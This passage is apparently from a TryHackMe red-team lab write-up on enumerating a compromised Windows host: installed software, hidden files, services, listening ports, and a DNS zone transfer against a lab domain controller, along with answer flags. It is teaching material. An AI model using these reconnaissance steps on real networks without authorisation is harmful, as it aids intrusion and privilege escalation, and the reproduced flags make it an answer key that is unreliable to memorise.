SIEM solutions work as log data aggregation center, where it collects log files from sensors and perform functions on the gathered data to identify and detect security threats or attacks. The following are some of the functions that a SIEM may offer:

    Log management: It captures and gathers data for the entire enterprise network in real-time.
    Event analytics: It applies advanced analytics to detect abnormal patterns or behaviors, available in the dashboard with charts and statistics.
    Incident monitoring and security alerts: It monitors the entire network, including connected users, devices, applications, etcetera, and as soon as attacks are detected, it alerts administrators immediately to take appropriate action to mitigate.
    Compliance management and reporting: It generates real-time reports at any time.

SIEM is capable of detecting advanced and unknown threats using integrated threat intelligence and AI technologies, including Insider threats, security vulnerabilities, phishing attacks, Web attacks, DDoS attacks, data exfiltration, etc.

The following are some of the SIEM products that are commonly seen in many enterprises:

    Splunk
    LogRhythm NextGen SIEM Platform
    SolarWinds Security Event Manager
    Datadog Security Monitoring
    many others

Intrusion Detection System and Intrusion Prevention System (NIDS/NIPS)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/65940a4ee566f7e9337159d3d7e1cf5f.png)

Network-based IDS/IPS have a similar concept to the host-based IDS/IPS. The main difference is that the network-based products focus on the security of a network instead of a host. The network-based solution will be based on sensors and agents distributed in the network devices and hosts to collect data. IDS and IPS are both detection and monitoring cybersecurity solutions that an enterprise uses to secure its internal systems. They both read network packets looking for abnormal behaviors and known threats pre-loaded into a previous database. The significant difference between both solutions is that the IDS requires human interaction or 3rd party software to analyze the data to take action. The IPS is a control system that accepts or rejects packets based on policies and rules.

The following are common enterprise IDS/IPS products 

    Palo Alto Networks
    Cisco's Next-Generation 
    McAfee Network Security Platform (NSP)
    Trend Micro TippingPoint
    Suricata

For more information about IDS/IPS, visit the reference link.
https://geekflare.com/ids-vs-ips-network-security-solutions/

### Applications and Services 

This task will expand our knowledge needed to learn more about the system. We discussed account discovery and security products within the system in previous tasks. We will continue learning more about the system, including:

    Installed applications
    Services and processes
    Sharing files and printers
    Internal services: DNS and local web applications

It is necessary to understand what the system provides in order to get the benefit of the information.

Installed Applications

First, we start enumerating the system for installed applications by checking the application's name and version. As a red teamer, this information will benefit us. We may find vulnerable software installed to exploit and escalate our system privileges. Also, we may find some information, such as plain-text credentials, is left on the system that belongs to other systems or services.

 We will be using the wmic Windows command to list all installed applications and their version.

```

PowerShell

           
			
PS C:\Users\thm> wmic product get name,version
Name                                                            Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     14.28.29910
AWS Tools for Windows                                           3.15.1248
Amazon SSM Agent                                                3.0.529.0
aws-cfn-bootstrap                                               2.0.5
AWS PV Drivers                                                  8.3.4
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  14.28.29910
```

Another interesting thing is to look for particular text strings, hidden directories, backup files. Then we can use the PowerShell cmdlets, Get-ChildItem, as follow:

```

PowerShell

           
			
PS C:\Users\thm> Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
```

Services and Process

Windows services enable the system administrator to create long-running executable applications in our own Windows sessions. Sometimes Windows services have misconfiguration permissions, which escalates the current user access level of permissions. Therefore, we must look at running services and perform services and processes reconnaissance.  For more details, you can read about process discovery on Attack MITRE.

Process discovery is an enumeration step to understand what the system provides. The red team should get information and details about running services and processes on a system. We need to understand as much as possible about our targets. This information could help us understand common software running on other systems in the network. For example, the compromised system may have a custom client application used for internal purposes. Custom internally developed software is the most common root cause of escalation vectors. Thus, it is worth digging more to get details about the current process.  

For more details about core Windows processes from the blue team perspective, check out the TryHackMe room: Core Windows Process.

Sharing files and Printers

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/4829eca7d15a4e9191a432cd1d35fb75.png)

Sharing files and network resources is commonly used in personal and enterprise environments. System administrators misconfigure access permissions, and they may have useful information about other accounts and systems. For more information on printer hacking, we suggest trying out the following TryHackMe room: Printer Hacking 101.

Internal services: DNS, local web applications, etc

Internal network services are another source of information to expand our knowledge about other systems and the entire environment. To get more details about network services that are used for external and internal network services, we suggest trying out the following rooms: Network Service, Network Service2.

The following are some of the internal services that are commonly used that we are interested in:

    DNS Services
    Email Services
    Network File Share
    Web application
    Database service



Let's try listing the running services using the Windows command prompt net start to check if there are any interesting running services.

```

PowerShell

           
			
PS C:\Users\thm> net start
These Windows services are started:

Active Directory Web Services
Amazon SSM Agent
Application Host Helper Service
Cryptographic Services
DCOM Server Process Launcher
DFS Namespace
DFS Replication
DHCP Client
Diagnostic Policy Service
THM Demo
DNS Client
```

We can see a service with the name THM Demo which we want to know more about.

Now let's look for the exact service name, which we need to find more information.

```

PowerShell

           
			
PS C:\Users\thm> wmic service where "name like 'THM Demo'" get Name,PathName
Name         PathName
THM Service  c:\Windows\thm-demo.exe
```

We find the file name and its path; now let's find more details using the Get-Process cmdlet. 

```

PowerShell

           
			
PS C:\Users\thm> Get-Process -Name thm-demo

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     82       9    13128       6200              3212   0 thm-service
```

Once we find its process ID, let's check if providing a network service by listing the listening ports within the system.

```

PowerShell

           
			
PS C:\Users\thm> netstat -noa |findstr "LISTENING" |findstr "3212"
  TCP    0.0.0.0:8080          0.0.0.0:0              LISTENING       3212
  TCP    [::]:8080             [::]:0                 LISTENING       3212
```

```
PS C:\Users\kkidd> wmic service | findstr "THM"
FALSE        FALSE       THM Service                                                                         0           Win32_Service      FALSE                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           FALSE            THM Service                                                                         Normal                   0                      THM Service                               c:\Windows\thm-service.exe                                                         0                                            0                        Own Process    TRUE           Auto       LocalSystem                  Start Pending                Degraded  Win32_ComputerSystem     AD                    0      25165801
PS C:\Users\kkidd> Get-Process -Name thm-service

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     78       9    12676       5716              2692   0 thm-service


PS C:\Users\kkidd> netstat -ano | findstr "LISTENING" | findstr "2692"
  TCP    0.0.0.0:13337          0.0.0.0:0              LISTENING       2692
  TCP    [::]:13337             [::]:0                 LISTENING       2692
```

Finally, we can see it is listening on port 8080. Now try to apply what we discussed and find the port number for THM Service. What is the port number?
*13337*

```
PS C:\Users\kkidd> curl 127.0.0.1:13337


StatusCode        : 200
StatusDescription : OK
Content           : Hi the flag is: THM{S3rv1cs_1s_3numerat37ed}
RawContent        : HTTP/1.1 200 OK
                    Content-Length: 44
                    Content-Type: text/plain; charset=utf-8
                    Date: Sun, 11 Sep 2022 00:03:11 GMT

                    Hi the flag is: THM{S3rv1cs_1s_3numerat37ed}
Forms             : {}
Headers           : {[Content-Length, 44], [Content-Type, text/plain; charset=utf-8], [Date, Sun, 11 Sep 2022 00:03:11
                    GMT]}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : System.__ComObject
RawContentLength  : 44

```

Visit the localhost on the port you found in Question #1. What is the flag?
*THM{S3rv1cs_1s_3numerat37ed}*

We mentioned that DNS service is a commonly used protocol in any active directory environment and network. The attached machine provides DNS services for AD. Let's enumerate the DNS by performing a zone transfer DNS and see if we can list all records.

We will perform DNS zone transfer using the Microsoft tool is nslookup.exe.

```

PowerShell

           
			
PS C:\Users\thm> nslookup.exe
Default Server:  UnKnown
Address:  ::1
```

Once we execute it, we provide the DNS server that we need to ask, which in this case is the target machine

```

NSlookup

           
			
> server 10.10.198.178
Default Server:  [MACHINE_IP]
Address:  MACHINE_IP
```

Now let's try the DNS zone transfer on the domain we find in the AD environment.

```

NSlookup

           
			
> ls -d thmredteam.com
[[10.10.198.178]]
 thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (732 900 600 86400 3600)
 thmredteam.com.                A      MACHINE_IP
 thmredteam.com.                NS     ad.thmredteam.com
***
 ad                             A      MACHINE_IP
```

The previous output is an example of successfully performing the DNS zone transfer.

Now enumerate the domain name of the domain controller, thmredteam.com, using the nslookup.exe, and perform a DNS zone transfer. What is the flag for one of the records?

```
PS C:\Users\kkidd> nslookup.exe
Default Server:  ip-10-0-0-2.eu-west-1.compute.internal
Address:  10.0.0.2

> server 10.10.198.178
Default Server:  ip-10-10-198-178.eu-west-1.compute.internal
Address:  10.10.198.178

> ls -d thmredteam.com
[ip-10-10-198-178.eu-west-1.compute.internal]
 thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
 thmredteam.com.                A      10.10.129.59
 thmredteam.com.                NS     ad.thmredteam.com
 _msdcs                         NS     ad.thmredteam.com
 _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
 _kerberos._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=88, ad.thmredteam.com
 _ldap._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _gc._tcp                       SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
 _kerberos._tcp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
 _kpasswd._tcp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
 _ldap._tcp                     SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _kerberos._udp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
 _kpasswd._udp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
 ad                             A      10.10.198.178
 DomainDnsZones                 A      10.10.129.59
 _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _ldap._tcp.DomainDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 flag                           TXT             "THM{DNS-15-Enumerated!}"

 ForestDnsZones                 A      10.10.129.59
 _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 _ldap._tcp.ForestDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
 www                            A      10.10.141.51
 thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
>
```


*THM{DNS-15-Enumerated!}*

### Conclusion 



This room is an introduction to client systems in corporate environments. The student should have a better understanding of how clients are used in a corporate network including:

    Network Infrastructure
    AD environment
    security measures (HIPS, AV, etc.)
    Internal applications and services


Hope you enjoyed the room and keep learning!


[[Phishing]]